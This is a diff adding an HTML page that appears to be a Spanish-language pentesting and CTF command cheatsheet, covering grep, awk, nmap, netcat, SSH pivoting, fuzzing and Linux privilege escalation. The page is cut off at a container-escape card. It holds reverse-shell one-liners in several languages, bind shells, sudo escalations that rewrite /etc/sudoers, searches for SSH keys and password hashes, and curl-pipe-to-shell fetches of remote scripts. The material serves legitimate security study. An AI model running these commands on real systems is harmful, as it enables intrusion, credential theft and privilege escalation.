@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberRef — Ultimate Cheatsheet</title>
+<link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<nav id="main-nav">
+  <div class="nav-brand">~/<span>cyberref</span></div>
+  <a href="#text">Text</a>
+  <a href="#red">Red</a>
+  <a href="#privesc">Privesc</a>
+  <a href="#web">Web</a>
+  <a href="#windows">Windows</a>
+  <a href="#ctf">CTF</a>
+  <a href="#crypto">Crypto</a>
+  <a href="#forensics">Forensics</a>
+  <a href="#regex">Regex</a>
+  <a href="#misc">Misc</a>
+  <a href="#payloads">Payloads</a>
+  <a href="#wordlists">Wordlists</a>
+</nav>
+
+<div class="search-wrap">
+  <div class="search-box">
+    <span class="search-icon">&#9906;</span>
+    <input type="text" id="global-search" placeholder="Buscar comandos, herramientas, técnicas... (Ctrl+K)" autocomplete="off" spellcheck="false">
+    <button class="search-clear" id="search-clear" onclick="clearSearch()">&#10005;</button>
+  </div>
+  <div class="search-stats" id="search-stats"></div>
+</div>
+
+<div class="vars-wrap"><div id="vars-bar"></div></div>
+
+<main>
+<div class="no-results" id="no-results"><strong>(._.)</strong>Sin resultados para "<span id="no-results-query"></span>"</div>
+
+<!-- ═══════════════════════════════════════════
+     TEXT PROCESSING
+═══════════════════════════════════════════ -->
+<section id="text">
+  <div class="section-header"><h2>// text processing</h2><span class="section-tag tag-g">grep · awk · sed · find</span></div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">grep</span><span class="cmd-card-desc">search &amp; filter</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">grep -r "pattern" /path</span><span class="cmd-comment">recursivo</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -i "pattern" file</span><span class="cmd-comment">case-insensitive</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -v "pattern" file</span><span class="cmd-comment">invertir match</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -n "pattern" file</span><span class="cmd-comment">con nº de línea</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -E "pat1|pat2" file</span><span class="cmd-comment">regex extendida / OR</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -o "pattern" file</span><span class="cmd-comment">solo el match</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -A 3 -B 3 "pat" file</span><span class="cmd-comment">contexto ±3 líneas</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -l "pattern" *</span><span class="cmd-comment">solo nombres ficheros</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -c "pattern" file</span><span class="cmd-comment">contar coincidencias</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -P "\d{1,3}\.\d{1,3}" file</span><span class="cmd-comment">Perl regex (PCRE)</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -rn "TODO" . --include="*.py"</span><span class="cmd-comment">filtrar extensión</span></div>
+        <div class="cmd-item"><span class="cmd-code">grep -a "string" binaryfile</span><span class="cmd-comment">buscar en binario</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">awk</span><span class="cmd-card-desc">field processor</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">awk '{print $1}' file</span><span class="cmd-comment">1ª columna</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk -F: '{print $1,$3}' /etc/passwd</span><span class="cmd-comment">sep ":" cols 1 y 3</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk 'NR==5' file</span><span class="cmd-comment">línea 5</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk 'NR>=5 && NR<=10' file</span><span class="cmd-comment">rango de líneas</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk '/pattern/{print $2}'</span><span class="cmd-comment">filtro + columna</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk '{sum+=$1} END{print sum}'</span><span class="cmd-comment">suma columna</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk '!seen[$0]++'</span><span class="cmd-comment">deduplicar</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk '{print NF, $0}'</span><span class="cmd-comment">nº campos por línea</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk 'length($0) > 80'</span><span class="cmd-comment">líneas largas</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk 'BEGIN{OFS=","}{print $1,$2}' f</span><span class="cmd-comment">cambiar separador out</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk '{gsub(/old/,"new"); print}'</span><span class="cmd-comment">reemplazar inline</span></div>
+        <div class="cmd-item"><span class="cmd-code">awk -v x=5 '$1>x{print}'</span><span class="cmd-comment">variable externa</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">sed</span><span class="cmd-card-desc">stream editor</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">sed 's/old/new/g' file</span><span class="cmd-comment">replace global</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed -i 's/old/new/g' file</span><span class="cmd-comment">in-place</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed -i.bak 's/old/new/g' file</span><span class="cmd-comment">in-place + backup</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed -n '5,10p' file</span><span class="cmd-comment">líneas 5-10</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed '/pattern/d' file</span><span class="cmd-comment">borrar líneas</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed '/^$/d' file</span><span class="cmd-comment">borrar vacías</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed 's/^/# /' file</span><span class="cmd-comment">comentar líneas</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed -n '/start/,/end/p' file</span><span class="cmd-comment">rango entre patrones</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed 's/\(.*\):/\1 ->/'</span><span class="cmd-comment">grupos de captura</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed '1i\HEADER' file</span><span class="cmd-comment">insertar al inicio</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed '$a\FOOTER' file</span><span class="cmd-comment">insertar al final</span></div>
+        <div class="cmd-item"><span class="cmd-code">sed -e 's/a/b/g' -e 's/c/d/g'</span><span class="cmd-comment">múltiples expresiones</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">sort · uniq · cut · tr · wc</span><span class="cmd-card-desc">pipeline tools</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">sort -u file</span><span class="cmd-comment">ordenar + unique</span></div>
+        <div class="cmd-item"><span class="cmd-code">sort -rn file</span><span class="cmd-comment">numérico inverso</span></div>
+        <div class="cmd-item"><span class="cmd-code">sort -t: -k3 -n file</span><span class="cmd-comment">por campo 3</span></div>
+        <div class="cmd-item"><span class="cmd-code">sort -R file</span><span class="cmd-comment">orden aleatorio</span></div>
+        <div class="cmd-item"><span class="cmd-code">uniq -c | sort -rn</span><span class="cmd-comment">contar + ordenar</span></div>
+        <div class="cmd-item"><span class="cmd-code">cut -d: -f1,3 file</span><span class="cmd-comment">campos 1 y 3</span></div>
+        <div class="cmd-item"><span class="cmd-code">cut -c1-10 file</span><span class="cmd-comment">caracteres 1-10</span></div>
+        <div class="cmd-item"><span class="cmd-code">tr 'a-z' 'A-Z'</span><span class="cmd-comment">uppercase</span></div>
+        <div class="cmd-item"><span class="cmd-code">tr -d '\r\n'</span><span class="cmd-comment">quitar CR y LF</span></div>
+        <div class="cmd-item"><span class="cmd-code">tr -s ' ' '\t'</span><span class="cmd-comment">spaces a tabs</span></div>
+        <div class="cmd-item"><span class="cmd-code">wc -l/-w/-c file</span><span class="cmd-comment">líneas/palabras/bytes</span></div>
+        <div class="cmd-item"><span class="cmd-code">paste file1 file2</span><span class="cmd-comment">merge columnas</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">find</span><span class="cmd-card-desc">file hunting</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">find / -name "*.conf" 2>/dev/null</span><span class="cmd-comment">buscar configs</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -perm -4000 2>/dev/null</span><span class="cmd-comment">binarios SUID</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -perm -2000 2>/dev/null</span><span class="cmd-comment">binarios SGID</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -writable -type f 2>/dev/null</span><span class="cmd-comment">ficheros escribibles</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -mmin -60 2>/dev/null</span><span class="cmd-comment">modificados última hora</span></div>
+        <div class="cmd-item"><span class="cmd-code">find . -size +10M -size -100M</span><span class="cmd-comment">rango de tamaño</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -user root -writable 2>/dev/null</span><span class="cmd-comment">root + writable</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -nouser 2>/dev/null</span><span class="cmd-comment">sin propietario</span></div>
+        <div class="cmd-item"><span class="cmd-code">find . -name "*.log" -delete</span><span class="cmd-comment">borrar logs</span></div>
+        <div class="cmd-item"><span class="cmd-code">find . -type f -exec md5sum {} \;</span><span class="cmd-comment">hash de ficheros</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -newer /tmp/ref 2>/dev/null</span><span class="cmd-comment">más nuevos que ref</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -name "id_rsa" 2>/dev/null</span><span class="cmd-comment">buscar claves SSH</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">xargs · tee · diff · strings</span><span class="cmd-card-desc">misc text tools</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">xargs -I{} cmd {}</span><span class="cmd-comment">placeholder</span></div>
+        <div class="cmd-item"><span class="cmd-code">find . -name "*.py" | xargs grep "pass"</span><span class="cmd-comment">grep en varios</span></div>
+        <div class="cmd-item"><span class="cmd-code">xargs -P 4 -n 1 cmd</span><span class="cmd-comment">4 procesos paralelos</span></div>
+        <div class="cmd-item"><span class="cmd-code">cmd | tee file.log</span><span class="cmd-comment">stdout + fichero</span></div>
+        <div class="cmd-item"><span class="cmd-code">cmd | tee -a file.log</span><span class="cmd-comment">append</span></div>
+        <div class="cmd-item"><span class="cmd-code">diff -u file1 file2</span><span class="cmd-comment">diff unificado</span></div>
+        <div class="cmd-item"><span class="cmd-code">diff -r dir1 dir2</span><span class="cmd-comment">diff directorios</span></div>
+        <div class="cmd-item"><span class="cmd-code">strings -n 8 binary</span><span class="cmd-comment">strings mínimo 8</span></div>
+        <div class="cmd-item"><span class="cmd-code">strings binary | grep -i pass</span><span class="cmd-comment">buscar contraseñas</span></div>
+        <div class="cmd-item"><span class="cmd-code">xxd file | head -20</span><span class="cmd-comment">hex dump</span></div>
+        <div class="cmd-item"><span class="cmd-code">xxd -r file.hex > file.bin</span><span class="cmd-comment">revertir hex</span></div>
+        <div class="cmd-item"><span class="cmd-code">od -A x -t x1z file</span><span class="cmd-comment">octal dump hex</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+<!-- ═══════════════════════════════════════════
+     RED TEAM / NETWORK
+═══════════════════════════════════════════ -->
+<section id="red">
+  <div class="section-header"><h2>// red team &amp; network</h2><span class="section-tag tag-r">nmap · nc · curl · ssh · pivoting</span></div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">nmap</span><span class="cmd-card-desc">port scanning</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">nmap -sV -sC -oA scan RHOST</span><span class="cmd-comment">default enum</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap -p- --min-rate 5000 -oN full RHOST</span><span class="cmd-comment">todos los puertos</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap -sU --top-ports 200 RHOST</span><span class="cmd-comment">UDP top 200</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap --script vuln RHOST</span><span class="cmd-comment">vulnerabilidades</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap -sn 192.168.1.0/24</span><span class="cmd-comment">ping sweep</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap -O RHOST</span><span class="cmd-comment">OS detection</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap --script smb-vuln* RHOST</span><span class="cmd-comment">SMB vulns</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap --script http-title -p80,443,8080 RHOST</span><span class="cmd-comment">títulos web</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap -sV --version-intensity 9 RHOST</span><span class="cmd-comment">versión agresiva</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap -T4 -A -v RHOST</span><span class="cmd-comment">agresivo + verbose</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap --script dns-brute DOMAIN</span><span class="cmd-comment">subdomain brute</span></div>
+        <div class="cmd-item"><span class="cmd-code">nmap -Pn -p22,80,443 RHOST</span><span class="cmd-comment">sin ping</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">netcat · socat</span><span class="cmd-card-desc">swiss knife</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">nc -lvnp PORT</span><span class="cmd-comment">listener</span></div>
+        <div class="cmd-item"><span class="cmd-code">nc -zv RHOST 1-1000</span><span class="cmd-comment">port scan</span></div>
+        <div class="cmd-item"><span class="cmd-code">nc -w 3 RHOST 80 < req.txt</span><span class="cmd-comment">enviar request</span></div>
+        <div class="cmd-item"><span class="cmd-code">mkfifo /tmp/f; nc -lvp PORT </tmp/f | /bin/bash >/tmp/f</span><span class="cmd-comment">shell interactiva</span></div>
+        <div class="cmd-item"><span class="cmd-code">socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane</span><span class="cmd-comment">socat pty shell</span></div>
+        <div class="cmd-item"><span class="cmd-code">socat TCP:RHOST:PORT PTY,raw,echo=0</span><span class="cmd-comment">cliente socat</span></div>
+        <div class="cmd-item"><span class="cmd-code">socat TCP-LISTEN:80,fork TCP:RHOST:8080</span><span class="cmd-comment">relay TCP</span></div>
+        <div class="cmd-item"><span class="cmd-code">nc RHOST PORT < /etc/hostname</span><span class="cmd-comment">enviar fichero</span></div>
+        <div class="cmd-item"><span class="cmd-code">nc -lvp PORT > received.file</span><span class="cmd-comment">recibir fichero</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">reverse shells</span><span class="cmd-card-desc">one-liners de referencia</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">bash -i >& /dev/tcp/IP/PORT 0>&1</span><span class="cmd-comment">bash</span></div>
+        <div class="cmd-item"><span class="cmd-code">sh -i >& /dev/tcp/IP/PORT 0>&1</span><span class="cmd-comment">sh</span></div>
+        <div class="cmd-item"><span class="cmd-code">python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call(["/bin/sh","-i"])'</span><span class="cmd-comment">python3</span></div>
+        <div class="cmd-item"><span class="cmd-code">php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'</span><span class="cmd-comment">php</span></div>
+        <div class="cmd-item"><span class="cmd-code">ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</span><span class="cmd-comment">ruby</span></div>
+        <div class="cmd-item"><span class="cmd-code">perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(PORT,inet_aton("IP")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'</span><span class="cmd-comment">perl</span></div>
+        <div class="cmd-item"><span class="cmd-code">python3 -c 'import pty; pty.spawn("/bin/bash")'</span><span class="cmd-comment">upgrade shell (1)</span></div>
+        <div class="cmd-item"><span class="cmd-code">export TERM=xterm; stty raw -echo; fg</span><span class="cmd-comment">upgrade shell (2)</span></div>
+        <div class="cmd-item"><span class="cmd-code">stty rows 50 cols 200</span><span class="cmd-comment">fix tamaño TTY</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">ssh tunneling &amp; pivoting</span><span class="cmd-card-desc">port forwarding</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">ssh -L 8080:RHOST:80 USER@RHOST</span><span class="cmd-comment">local forward</span></div>
+        <div class="cmd-item"><span class="cmd-code">ssh -R PORT:localhost:PORT USER@LHOST</span><span class="cmd-comment">remote forward</span></div>
+        <div class="cmd-item"><span class="cmd-code">ssh -D 1080 USER@RHOST</span><span class="cmd-comment">SOCKS5 proxy</span></div>
+        <div class="cmd-item"><span class="cmd-code">ssh -N -f -L 5432:db:5432 USER@RHOST</span><span class="cmd-comment">background</span></div>
+        <div class="cmd-item"><span class="cmd-code">ssh -J jump1,jump2 USER@RHOST</span><span class="cmd-comment">múltiples saltos</span></div>
+        <div class="cmd-item"><span class="cmd-code">sshuttle -r USER@RHOST 192.168.1.0/24</span><span class="cmd-comment">VPN over SSH</span></div>
+        <div class="cmd-item"><span class="cmd-code">chisel server -p 8080 --reverse</span><span class="cmd-comment">chisel server</span></div>
+        <div class="cmd-item"><span class="cmd-code">chisel client LHOST:8080 R:socks</span><span class="cmd-comment">chisel SOCKS</span></div>
+        <div class="cmd-item"><span class="cmd-code">proxychains nmap -sT RHOST</span><span class="cmd-comment">nmap via proxy</span></div>
+        <div class="cmd-item"><span class="cmd-code">ssh-keygen -t ed25519 -C "key"</span><span class="cmd-comment">generar clave</span></div>
+        <div class="cmd-item"><span class="cmd-code">cat id_rsa.pub >> ~/.ssh/authorized_keys</span><span class="cmd-comment">añadir clave</span></div>
+        <div class="cmd-item"><span class="cmd-code">ssh -o StrictHostKeyChecking=no USER@RHOST</span><span class="cmd-comment">skip host check</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">curl / wget / requests</span><span class="cmd-card-desc">HTTP tools</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">curl -I url</span><span class="cmd-comment">solo headers</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -X POST -d "user=a&pass=b" url</span><span class="cmd-comment">POST form</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -X POST -H "Content-Type: application/json" -d '{"k":"v"}' url</span><span class="cmd-comment">POST JSON</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -b "session=TOKEN" url</span><span class="cmd-comment">con cookie</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -H "Authorization: Bearer JWT" url</span><span class="cmd-comment">JWT header</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -k --ssl-no-revoke url</span><span class="cmd-comment">skip SSL</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -x http://127.0.0.1:8080 url</span><span class="cmd-comment">via proxy</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -L --max-redirs 10 url</span><span class="cmd-comment">seguir redirects</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -u USER:PASS url</span><span class="cmd-comment">HTTP Basic Auth</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -T file.txt ftp://host/</span><span class="cmd-comment">upload FTP</span></div>
+        <div class="cmd-item"><span class="cmd-code">wget -r -np -nH -P /tmp url</span><span class="cmd-comment">mirror site</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -s url | python3 -m json.tool</span><span class="cmd-comment">pretty JSON</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">ffuf · gobuster · feroxbuster</span><span class="cmd-card-desc">web fuzzing</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">ffuf -w wl -u http://RHOST/FUZZ</span><span class="cmd-comment">dir bruteforce</span></div>
+        <div class="cmd-item"><span class="cmd-code">ffuf -w wl -u http://RHOST/FUZZ -e .php,.html,.txt</span><span class="cmd-comment">extensiones</span></div>
+        <div class="cmd-item"><span class="cmd-code">ffuf -w wl -u http://RHOST -H "Host: FUZZ.DOMAIN"</span><span class="cmd-comment">vhost enum</span></div>
+        <div class="cmd-item"><span class="cmd-code">ffuf -w wl -u http://RHOST?id=FUZZ -fc 403</span><span class="cmd-comment">param fuzz</span></div>
+        <div class="cmd-item"><span class="cmd-code">ffuf -w wl -u http://RHOST/FUZZ -fs 0</span><span class="cmd-comment">filtrar size 0</span></div>
+        <div class="cmd-item"><span class="cmd-code">ffuf -w u:wl1 -w p:wl2 -u http://RHOST/login -X POST -d "user=FUZZ&pass=FUZZ2" -fc 302</span><span class="cmd-comment">doble wordlist</span></div>
+        <div class="cmd-item"><span class="cmd-code">gobuster dir -u url -w wl -x php,html,bak</span><span class="cmd-comment">gobuster dir</span></div>
+        <div class="cmd-item"><span class="cmd-code">gobuster dns -d domain -w wl -r 8.8.8.8</span><span class="cmd-comment">dns enum</span></div>
+        <div class="cmd-item"><span class="cmd-code">gobuster vhost -u http://RHOST -w wl</span><span class="cmd-comment">vhost gobuster</span></div>
+        <div class="cmd-item"><span class="cmd-code">feroxbuster -u url -w wl --depth 3 -e</span><span class="cmd-comment">recursivo</span></div>
+        <div class="cmd-item"><span class="cmd-code">wfuzz -c -z file,wl --hc 404 http://RHOST/FUZZ</span><span class="cmd-comment">wfuzz</span></div>
+        <div class="cmd-item"><span class="cmd-code">dirsearch -u http://RHOST -e php,html,js</span><span class="cmd-comment">dirsearch</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+<!-- ═══════════════════════════════════════════
+     PRIVILEGE ESCALATION
+═══════════════════════════════════════════ -->
+<section id="privesc">
+  <div class="section-header"><h2>// privilege escalation</h2><span class="section-tag tag-a">sudo · SUID · cron · caps · kernel</span></div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">sudo — GTFOBins</span><span class="cmd-card-desc">escalada</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">sudo -l</span><span class="cmd-comment">ver permisos</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo vim -c ':!/bin/bash'</span><span class="cmd-comment">vim</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo less /etc/passwd; !/bin/sh</span><span class="cmd-comment">less</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo awk 'BEGIN{system("/bin/bash")}'</span><span class="cmd-comment">awk</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo python3 -c 'import os;os.system("/bin/bash")'</span><span class="cmd-comment">python3</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo find . -exec /bin/bash \; -quit</span><span class="cmd-comment">find</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo env /bin/bash</span><span class="cmd-comment">env</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo tee /etc/sudoers <<< "user ALL=(ALL) NOPASSWD:ALL"</span><span class="cmd-comment">tee</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</span><span class="cmd-comment">tar</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"</span><span class="cmd-comment">zip</span></div>
+        <div class="cmd-item"><span class="cmd-code">sudo nmap --interactive; !sh</span><span class="cmd-comment">nmap (legacy)</span></div>
+        <div class="cmd-item"><span class="cmd-code">echo "os.execute('/bin/bash')" > /tmp/x; sudo lua /tmp/x</span><span class="cmd-comment">lua</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">enum local</span><span class="cmd-card-desc">recon de sistema</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">id; whoami; groups</span><span class="cmd-comment">usuario actual</span></div>
+        <div class="cmd-item"><span class="cmd-code">uname -a; cat /proc/version</span><span class="cmd-comment">kernel</span></div>
+        <div class="cmd-item"><span class="cmd-code">cat /etc/os-release</span><span class="cmd-comment">distro</span></div>
+        <div class="cmd-item"><span class="cmd-code">cat /etc/passwd | grep -v nologin | grep -v false</span><span class="cmd-comment">usuarios con shell</span></div>
+        <div class="cmd-item"><span class="cmd-code">cat /etc/shadow 2>/dev/null</span><span class="cmd-comment">hashes (si readable)</span></div>
+        <div class="cmd-item"><span class="cmd-code">ps aux --forest</span><span class="cmd-comment">procesos</span></div>
+        <div class="cmd-item"><span class="cmd-code">ss -tulnp</span><span class="cmd-comment">puertos</span></div>
+        <div class="cmd-item"><span class="cmd-code">crontab -l; ls -la /etc/cron*; cat /etc/crontab</span><span class="cmd-comment">cron</span></div>
+        <div class="cmd-item"><span class="cmd-code">env; printenv | grep -i pass</span><span class="cmd-comment">env vars con pass</span></div>
+        <div class="cmd-item"><span class="cmd-code">cat ~/.bash_history</span><span class="cmd-comment">historial</span></div>
+        <div class="cmd-item"><span class="cmd-code">ls -la /home/*/</span><span class="cmd-comment">dirs de usuarios</span></div>
+        <div class="cmd-item"><span class="cmd-code">cat /proc/net/arp</span><span class="cmd-comment">hosts en ARP cache</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">capabilities &amp; SUID</span><span class="cmd-card-desc">linux privesc</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">getcap -r / 2>/dev/null</span><span class="cmd-comment">buscar caps</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -perm -u=s -type f 2>/dev/null</span><span class="cmd-comment">SUID</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -perm -g=s -type f 2>/dev/null</span><span class="cmd-comment">SGID</span></div>
+        <div class="cmd-item"><span class="cmd-code">python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'</span><span class="cmd-comment">cap_setuid</span></div>
+        <div class="cmd-item"><span class="cmd-code">capsh --decode=0000003fffffffff</span><span class="cmd-comment">decodificar caps</span></div>
+        <div class="cmd-item"><span class="cmd-code">cat /proc/1/status | grep -E "Cap|Uid"</span><span class="cmd-comment">caps proceso</span></div>
+        <div class="cmd-item"><span class="cmd-code">./vim -c ':py3 import os;os.setuid(0);os.execl("/bin/sh","sh","-c","reset;exec sh")'</span><span class="cmd-comment">vim SUID</span></div>
+        <div class="cmd-item"><span class="cmd-code">./cp --preserve=mode /bin/bash /tmp/bash</span><span class="cmd-comment">cp SUID</span></div>
+        <div class="cmd-item"><span class="cmd-code">/tmp/bash -p</span><span class="cmd-comment">bash SUID (-p)</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">scripts de enum</span><span class="cmd-card-desc">automated</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">curl -L https://github.com/carlospolop/peass-ng/releases/latest/download/linpeas.sh | sh 2>&1 | tee /tmp/lp.txt</span><span class="cmd-comment">linpeas</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash</span><span class="cmd-comment">linenum</span></div>
+        <div class="cmd-item"><span class="cmd-code">curl -L https://github.com/mzet-/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh | bash</span><span class="cmd-comment">exploit suggester</span></div>
+        <div class="cmd-item"><span class="cmd-code">python3 -m http.server SRVPORT</span><span class="cmd-comment">servidor python</span></div>
+        <div class="cmd-item"><span class="cmd-code">php -S 0.0.0.0:SRVPORT</span><span class="cmd-comment">servidor PHP</span></div>
+        <div class="cmd-item"><span class="cmd-code">upx -d binary</span><span class="cmd-comment">desempaquetar UPX</span></div>
+        <div class="cmd-item"><span class="cmd-code">ltrace ./binary</span><span class="cmd-comment">trazar llamadas lib</span></div>
+        <div class="cmd-item"><span class="cmd-code">strace ./binary 2>&1 | grep -E "open|read|write"</span><span class="cmd-comment">trazar syscalls</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">writable paths &amp; cron abuse</span><span class="cmd-card-desc">path hijack</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">echo $PATH</span><span class="cmd-comment">PATH actual</span></div>
+        <div class="cmd-item"><span class="cmd-code">export PATH=/tmp:$PATH</span><span class="cmd-comment">añadir /tmp al PATH</span></div>
+        <div class="cmd-item"><span class="cmd-code">cat /etc/crontab | grep -v "^#"</span><span class="cmd-comment">cron system</span></div>
+        <div class="cmd-item"><span class="cmd-code">ls -la /etc/cron.d/ /var/spool/cron/</span><span class="cmd-comment">cron dirs</span></div>
+        <div class="cmd-item"><span class="cmd-code">pspy64</span><span class="cmd-comment">procesos en tiempo real</span></div>
+        <div class="cmd-item"><span class="cmd-code">find / -writable -path "*/cron*" 2>/dev/null</span><span class="cmd-comment">cron escribible</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">docker &amp; container escape</span><span class="cmd-card-desc">container privesc</span></div>
+      <div class="cmd-list">
